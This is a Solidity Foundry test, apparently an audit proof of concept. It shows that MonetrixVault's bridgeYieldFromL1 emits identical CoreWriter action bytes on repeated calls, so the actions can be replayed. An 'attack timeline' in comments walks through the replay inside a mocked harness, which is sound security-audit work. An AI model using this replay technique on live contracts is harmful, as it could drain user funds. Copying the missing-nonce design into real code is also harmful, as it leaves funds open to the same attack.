// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/interfaces/HyperCoreConstants.sol";

contract SpyCoreWriter {
    bytes[] public recordedActions;
    uint256 public actionCount;

    function sendRawAction(bytes calldata action) external {
        recordedActions.push(action);
        actionCount++;
    }

    fallback() external payable returns (bytes memory) {
        return "";
    }
}

contract AuditAgentPoC is ToL1WeiHarness {
    SpyCoreWriter spy;

    function setUp() public override {
        super.setUp();
        spy = new SpyCoreWriter();
        vm.etch(HyperCoreConstants.CORE_WRITER, address(spy).code);
    }

    function test_exploit() public {
        // ATTACK TIMELINE:
        // 1. [Setup] Mock L1 spot USDC balance to allow bridging and deposit funds to create yield shortfall
        _mockVaultL1SpotUsdc(type(uint64).max);
        _depositAs(user1, 60_000e6);

        // 2. [T=+6h] Advance time and bridge principal to establish outstanding L1 principal
        vm.warp(block.timestamp + 6 hours);
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);

        // 3. [T=+1s] Prime distributable surplus to create a valid yield shortfall
        _primeDistributable(5_000e6);

        // 4. [T=+1s] Operator calls bridgeYieldFromL1 for the first time
        vm.prank(operator);
        vault.bridgeYieldFromL1(5_000e6);

        // 5. [T=+1s] Operator calls bridgeYieldFromL1 for the second time with identical parameters
        // (In a real scenario, the operator could just replay the raw action bytes directly to CoreWriter)
        vm.prank(operator);
        vault.bridgeYieldFromL1(5_000e6);

        // 6. [Assert] Verify that the exact same action bytes were produced both times, proving lack of nonce/domain separation
        uint256 count = spy.actionCount();
        assertGe(count, 2, "CoreWriter should have received at least 2 actions");

        bytes memory action1 = spy.recordedActions(0);
        bytes memory action2 = spy.recordedActions(1);

        assertEq(action1.length, action2.length, "Action lengths must match");
        assertEq(keccak256(action1), keccak256(action2), "VULNERABILITY: Identical action bytes produced without nonce or domain separation, enabling replay attacks");
    }
}
